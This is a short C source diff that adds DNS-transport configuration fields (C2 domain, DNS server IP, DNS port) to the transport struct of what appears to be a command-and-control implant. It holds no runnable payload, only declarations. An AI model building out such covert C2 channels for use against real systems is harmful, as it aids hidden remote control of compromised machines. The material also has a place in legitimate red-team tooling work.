@@ -121,6 +121,12 @@ typedef struct
             LPSTR   Name;   /* TODO: change type to BUFFER */
             HANDLE  Handle;
 #endif
+
+#ifdef TRANSPORT_DNS
+            PCHAR   Domain;       /* C2 domain (e.g., "c2.example.com") */
+            DWORD   DnsServerIp;  /* DNS server IP (network byte order), 0 = system DNS */
+            WORD    DnsPort;      /* DNS port (default 53) */
+#endif
         } Transport;
 
         struct _CONFIG {
